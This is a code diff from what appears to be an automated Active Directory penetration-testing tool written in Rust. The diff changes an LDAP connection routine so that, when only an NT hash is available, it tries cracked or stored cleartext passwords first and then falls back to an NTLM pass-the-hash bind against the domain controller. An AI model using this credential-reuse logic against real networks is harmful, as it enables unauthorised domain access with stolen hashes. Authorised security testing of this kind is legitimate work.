@@ -271,50 +271,65 @@ async fn ldap_connect(
 ) -> std::result::Result<ldap::LdapSession, StepResult> {
     let (user, secret, use_hash) = ctx.effective_creds();
 
-    // If the operator authenticated with an NT hash, LDAP simple bind will
-    // fail.  Try to find a plaintext password for the same account first.
-    let password: String = if use_hash {
-        // Check cracked / known cleartext passwords
-        if let Some(cleartext) = state.cracked.get(user) {
+    // If the operator authenticated with an NT hash, prefer cleartext if we
+    // already cracked/know it, otherwise use NTLM pass-the-hash bind.
+    if use_hash {
+        // Check cracked / known cleartext passwords first
+        let cleartext: Option<String> = if let Some(ct) = state.cracked.get(user) {
             debug!(
                 "LDAP: using cracked cleartext for {} instead of NT hash",
                 user
             );
-            cleartext.clone()
+            Some(ct.clone())
         } else if let Some(cred) = state.credentials.get(user) {
             if cred.secret_type == SecretType::Password {
                 debug!("LDAP: using stored password for {}", user);
-                cred.secret.clone()
+                Some(cred.secret.clone())
             } else {
-                return Err(StepResult {
-                    success: false,
-                    output: format!(
-                        "LDAP simple bind requires a password, but only an NT hash is available for '{}'. \
-                         Crack the hash or provide plaintext credentials.",
-                        user
-                    ),
-                    new_credentials: 0,
-                    new_admin_hosts: 0,
-                });
+                None
             }
         } else {
-            return Err(StepResult {
-                success: false,
-                output: format!(
-                    "LDAP simple bind cannot authenticate with an NT hash (user: '{}'). \
-                     Use --password or crack the hash first.",
-                    user
-                ),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            });
-        }
-    } else {
-        secret.to_string()
-    };
+            None
+        };
 
-    match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, &password, ctx.use_ldaps).await
-    {
+        if let Some(password) = cleartext {
+            match ldap::LdapSession::connect(
+                &ctx.dc_ip,
+                &ctx.domain,
+                user,
+                &password,
+                ctx.use_ldaps,
+            )
+            .await
+            {
+                Ok(conn) => return Ok(conn),
+                Err(e) => {
+                    debug!(
+                        "LDAP cleartext bind failed ({}), falling back to NTLM hash bind",
+                        e
+                    );
+                }
+            }
+        }
+
+        // Fall back to NTLM pass-the-hash bind
+        return ldap::LdapSession::connect_with_hash(
+            &ctx.dc_ip,
+            &ctx.domain,
+            user,
+            secret,
+            ctx.use_ldaps,
+        )
+        .await
+        .map_err(|e| StepResult {
+            success: false,
+            output: format!("LDAP NTLM bind failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        });
+    }
+
+    match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, secret, ctx.use_ldaps).await {
         Ok(conn) => Ok(conn),
         Err(e) => Err(StepResult {
             success: false,
